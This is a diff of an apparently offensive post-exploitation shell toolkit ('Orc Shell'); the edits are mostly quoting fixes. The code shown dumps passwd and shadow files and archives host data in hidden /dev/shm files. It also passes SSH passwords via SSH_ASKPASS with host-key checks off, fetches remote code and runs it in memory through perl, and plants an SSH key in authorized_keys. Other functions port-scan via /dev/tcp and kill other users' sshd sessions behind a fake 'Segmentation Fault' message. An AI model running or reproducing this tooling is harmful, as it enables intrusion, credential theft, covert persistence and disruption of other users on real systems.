@@ -77,12 +77,12 @@ trap "rm -rf /dev/shm/.q" EXIT TERM INT
 # Creates a copy of this scipt in variable backup
 # Should be start like "ENV=o.rc sh -i".
 backup=""
-if [ -r "$BASH_SOURCE" -a ! -r "$ENV" ]; then
+if [ -r "$BASH_SOURCE" ] && [ ! -r "$ENV" ]; then
   # Script was started in bash via source.
   ENV=$BASH_SOURCE
 fi
 if [ -r "$ENV" ]; then
-  backup=`cat $ENV`
+  backup=$(cat "$ENV")
   # Convert to absolute file name for later use.
   ENV=$(realpath "$ENV")
 fi
@@ -131,7 +131,7 @@ log2outp() {
     return 1
   fi
   echo "$@" >> "$OUTP/log.txt"
-  local basename=$1
+  basename=$1
   shift
   if [ $# -lt 1 ]; then
     echo 'missing command to execute'
@@ -144,7 +144,7 @@ getinfo() {
   echo "Gathering useful command output."
   echo "Find it in $HOME/f.tar.xz"
   OUTP=$HOME/files/
-  mkdir --mode 700 $OUTP
+  mkdir --mode 700 "$OUTP"
   log2outp passwd getent passwd
   log2outp uname uname -a
   log2outp ps ps -weFH
@@ -170,7 +170,7 @@ getinfo() {
     log2outp ifconfig ip link
   fi
   log2outp netstat netstat -peanut
-  if [ "$EUID" = "0" -o -O "/root" ]; then
+  if [ "$EUID" = "0" ] || [ -O "/root" ]; then
     # Variable EUID is defined in the bash.
     # Check EUID of /root works in dash (and in bash).
     log2outp shadow getent shadow
@@ -191,17 +191,17 @@ getinfo() {
     fi
   fi
   # Stores all log files in one compressed tar archive.
-  tar -cJf $HOME/f.tar.xz $OUTP
+  tar -cJf "$HOME/f.tar.xz" "$OUTP"
   if [ $? -gt 0 ]; then
     # maybe the tar internal xz fail. Try an external xz compression.
-    tar -cf - $OUTP | xz -c -9 > $HOME/f.tar.xz
+    tar -cf - "$OUTP" | xz -c -9 > "$HOME/f.tar.xz"
   fi
   if [ $? -gt 0 ]; then
     # maybe xz command failed. Try the old gzip inside tar
-    tar -czf $HOME/f.tar.gz $OUTP
+    tar -czf "$HOME/f.tar.gz" "$OUTP"
   fi
   # Remove the single log files. Keep only the archive file.
-  rm -rf $OUTP
+  rm -rf "$OUTP"
 }
 
 timedshell() { 
@@ -247,7 +247,7 @@ ourpts() {
   mypts=${mytty#/dev/pts/}
   # Check if it is a pts device
   if [ "/dev/pts/$mypts" = "$mytty" ]; then
-    echo $mypts
+    echo "$mypts"
   fi
 }
 
@@ -257,7 +257,7 @@ getidle() {
   # Globals   : our_pty could contain the number of our PTY
   export our_pty=$(ourpts)
   stat /dev/pts/* -c '%n %X %U' |
-  awk -v now=$(date +%s) '$1 ~ /\/[0-9]+$/ {
+  awk -v now="$(date +%s)" '$1 ~ /\/[0-9]+$/ {
       gsub( /[^0-9]/, "", $1 )
       list[$1]="PTY " $1 " is " now-$2 " seconds idle and owned by " $3
       if( $1==ENVIRON["our_pty"] ) list[$1]=list[$1] " ** this is us **"}
@@ -266,7 +266,7 @@ getidle() {
 }
 
 srm() {
-shred -vzfun 2 $1
+shred -vzfun 2 "$1"
 }
 
 qssh() {
@@ -275,7 +275,7 @@ if tty | grep -q "not"; then
 	echo "echo $1" >> /dev/shm/.q/.k
 	chmod a+x /dev/shm/.q/.k
 	shift
-	DISPLAY="" SSH_ASKPASS="/dev/shm/.q/.k" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -T $@
+	DISPLAY="" SSH_ASKPASS="/dev/shm/.q/.k" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -T "$@"
 else
 	echo "You've got a tty. You can't use qssh."
 fi
@@ -292,9 +292,9 @@ rm /dev/shm/.q/.c
 
 memexec() {
 memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
-finalmem=$(echo $memfda | base64 -d)
+finalmem=$(echo "$memfda" | base64 -d)
 finalmem=${finalmem}$(echo -ne "$memfile/ or die;\n")
-finalmem=${finalmem}$(echo $memfdb | base64 -d)
+finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
 echo "$finalmem" | perl
 }
 
@@ -317,16 +317,16 @@ orc_loadURL 'https://raw.githubusercontent.com/zMarch/suspect/master/suspect.sh'
 keyinstall() {
 touch /dev/shm/.q/.ssh
 touch -r /
-sshkey="ssh-rsa [YOUR KEY HERE] `whoami`@`hostname`"
-echo $sshkey >> $NHOME/.ssh/authorized_keys
+sshkey="ssh-rsa [YOUR KEY HERE] $(whoami)@$(hostname)"
+echo "$sshkey" >> "$NHOME/.ssh/authorized_keys"
 }
 
 psgrep() {
-ps -weFH | grep $1 | grep -v grep
+ps -weFH | grep "$1" | grep -v grep
 }
 
 getescape() {
-ps --no-header aux | awk -F" " '{print $1" "$2}' | grep "^`id -u`"i | awk '{print $2}' | tr ' ' '\n' | while read i; do
+ps --no-header aux | awk -F" " '{print $1" "$2}' | grep "^$(id -u)"i | awk '{print $2}' | tr ' ' '\n' | while read i; do
 if ls -di --color=never "/proc/$i/root/" | grep -qe "^2\ "; then
 	echo "process $i seems to be outside the jail..."
 	fi
@@ -361,7 +361,7 @@ echo "Checking to see if we're in one giant simulation..."
 portscan() {
 porta="21 22 23 80 443 8080 8443 129 445 3389 3306"
 echo "Starting portscan..."
-echo $porta | tr ' ' '\n' | while read i;do
+echo "$porta" | tr ' ' '\n' | while read i;do
 bash -c "echo '' > /dev/tcp/$1/$i" 2>/dev/null
 	if echo $? | grep -q 0; then
 	echo "Host $1 port $i open"
@@ -370,7 +370,7 @@ done
 }
 
 fpssh() {
-ssh-keyscan $1
+ssh-keyscan "$1"
 }
 
 getip() {
@@ -407,35 +407,35 @@ sorry(){
 	if hash ipcalc 2>/dev/null; then
 	echo "Pinging IPs in the background..."
 		if hash ifconfig 2>/dev/null; then
-		valid=$(seq -f $(ipcalc -n --minaddr --maxaddr `ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}'` | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
-		echo $valid | tr ' ' '\n' | while read i;do
-			 if ping -c1 -q $i | grep -q "\ 0%"; then
-			 echo $i is alive >> /dev/shm/.q/ips
+		valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
+		echo "$valid" | tr ' ' '\n' | while read i;do
+			 if ping -c1 -q "$i" | grep -q "\ 0%"; then
+			 echo "$i is alive" >> /dev/shm/.q/ips
 			fi
 		done
 	else 
-	valid=$(seq -f $(ipcalc -n --minaddr --maxaddr `ip addr show | grep inet | grep -i "broadcast\|brd" | awk -F ' ' '{print $2}'` | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
-	echo $valid | tr ' ' '\n' | while read i;do
-		 if ping -c1 -q $i | grep -q "\ 0%"; then
-		 echo $i is alive >> /dev/shm/.q/ips
+	valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ip addr show | grep inet | grep -i "broadcast\|brd" | awk -F ' ' '{print $2}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
+	echo "$valid" | tr ' ' '\n' | while read i;do
+		 if ping -c1 -q "$i" | grep -q "\ 0%"; then
+		 echo "$i is alive" >> /dev/shm/.q/ips
 		fi
 	done
 	fi
 	else echo "No ipcalc. Checking if we've got a /24 and then pinging the first one..."
 		if hash ifconfig 2>/dev/null; then
 		if ifconfig | grep -q "255.255.255.0"; then 
-		INPUT=$(seq -f `ifconfig | grep inet | grep -i broadcast | grep -v inet6 | grep "255.255.255.0" | head -n1 | awk -F " " '{print $2}' | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'`)
-		echo $INPUT | tr ' ' '\n' | while read i;do
-			if ping -c1 -q $i | grep -q "\ 0%"; then
-			echo $i is alive >> /dev/shm/.q/ips
+		INPUT=$(seq -f $(ifconfig | grep inet | grep -i broadcast | grep -v inet6 | grep "255.255.255.0" | head -n1 | awk -F " " '{print $2}' | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
+		echo "$INPUT" | tr ' ' '\n' | while read i;do
+			if ping -c1 -q "$i" | grep -q "\ 0%"; then
+			echo "$i" is alive >> /dev/shm/.q/ips
 			fi
 		done
 		else 
 			if ip addr show | grep -E '/24*.brd'; then
-			INPUT=$(seq -f `ip addr show | grep brd |grep "/24" | head -n 1| awk -F " " {'print $2'} | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'`)
-			echo $INPUT | tr ' ' '\n' | while read i;do
-				 if ping -c1 -q $i | grep -q "\ 0%"; then
-				 echo $i is alive >> /dev/shm/.q/ips
+			INPUT=$(seq -f $(ip addr show | grep brd |grep "/24" | head -n 1| awk -F " " {'print $2'} | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
+			echo "$INPUT" | tr ' ' '\n' | while read i;do
+				 if ping -c1 -q "$i" | grep -q "\ 0%"; then
+				 echo "$i is alive" >> /dev/shm/.q/ips
 				fi
 			done
 			fi
@@ -457,7 +457,7 @@ echo "ARP table:"
 echo "Pinging broadcast."
 echo "Please wait..."
 	if hash ifconfig 2>/dev/null; then
-	ping -c3 -i 10 -b $(ipcalc -b `ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}'` | awk -F "=" '{print $2 " "}' | tr -d "\n")
+	ping -c3 -i 10 -b $(ipcalc -b $(ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}') | awk -F "=" '{print $2 " "}' | tr -d "\n")
 	else ping -c3 -i 10 -b $(ip addr show | grep inet | grep brd | awk -F ' ' '{print $4}')
 	fi
 echo "Broadcast ping is done."
@@ -510,7 +510,7 @@ hangup() {
   for PTS_ID in $PTS_LIST; do
     PTS_NAME="pts/$PTS_ID"
     echo "Terminating $PTS_NAME"
-    OWNER=$(stat -c '%U' /dev/$PTS_NAME)
+    OWNER=$(stat -c '%U' "/dev/$PTS_NAME")
     if [ "$OWNER" = "" ]; then
       echo "Something is wrong: can't get the owner of $PTS_NAME"
       continue
@@ -522,9 +522,9 @@ hangup() {
       continue
     fi
     echo "SSHD PID is $SSHD_PID"
-    echo 'Segmentation Fault.' > /dev/$PTS_NAME
+    echo 'Segmentation Fault.' > "/dev/$PTS_NAME"
     sleep 2
-    kill -9 $SSHD_PID
+    kill -9 "$SSHD_PID"
   done
 }
 
@@ -539,7 +539,7 @@ echo "Doing some basic listing of the usual suspects..."
 echo -ne "Kernel: "
 uname -rv
 echo -ne "glibc: "
-`ldd $(command -v id) | grep --color=never libc.so | awk -F " " '{print $3}'` | grep --color=never -i version | grep -v crypt
+$(ldd $(command -v id) | grep --color=never libc.so | awk -F " " '{print $3}') | grep --color=never -i version | grep -v crypt
 echo -ne "dbus: "
 dbus-daemon --version | grep --color=never Daemon
 echo -ne "Init system is: "
@@ -626,7 +626,7 @@ echo "============================"
 echo "=== Welcome to Orc Shell ==="
 echo "Run gethelp to see a list of commands."
 echo "/dev/shm/.q should be deleted upon exit."
-PS1='$USER'"@`hostname`:"'$PWD'"$ " 
+PS1='$USER'"@$(hostname):"'$PWD'"$ " 
 HOME="/dev/shm/.q"
-NHOME=$(getent passwd | grep --color=never `id -u` | cut -d: -f 6)
+NHOME=$(getent passwd | grep --color=never "$(id -u)" | cut -d: -f 6)
 #rm $ENV
